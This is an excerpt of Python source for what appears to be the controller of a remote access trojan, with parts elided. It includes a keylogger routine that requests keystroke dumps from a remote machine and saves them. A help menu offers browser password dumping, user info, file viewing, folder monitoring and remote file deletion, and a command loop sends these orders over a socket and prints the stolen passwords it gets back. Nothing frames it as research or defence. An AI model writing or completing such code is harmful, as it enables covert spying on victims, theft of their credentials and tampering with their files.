...
def keylogger(option):
    if option == "start":
        ...
        user_name = input('Please enter the name of the keystrokes: ')
        send(b"keydump")
        ...
        if intBuffer == "error":
            ...
            with open(f'{user_name}_keylogger.txt', 'a+') as kl:
                kl.write(strLogs)
                print('writing')
            print(f"\n{strLogs}")
...
def show_help():
    ...
    print("V View files")
    print("U User Info")
    print("D-P Dump Browser Passwords")
    ...
    print("START WATCHDOG (FOLDER MON)")
    print("STOP WATCHDOG (FOLDER MON)")
    print('del Path to File (to Delete file)')
    print("C Close connection")
    ...
    try:
        while True:
            ...
            if strChoice == "h":
                ...
                conn.close()
                break
            elif strChoice.split(' ')[0] == 'start':
                send(strChoice.encode())
            elif strChoice.split(' ')[0].lower() == 'd-p':
                send(strChoice.encode())
                bf = recv(intBuff).decode()
                res = recvall(int(bf)).decode()
                print(res)
            elif strChoice.split(' ')[0] == 'stop':
                send(strChoice.encode())
            elif strChoice[:3] == 'del':
                delete_file(strChoice)
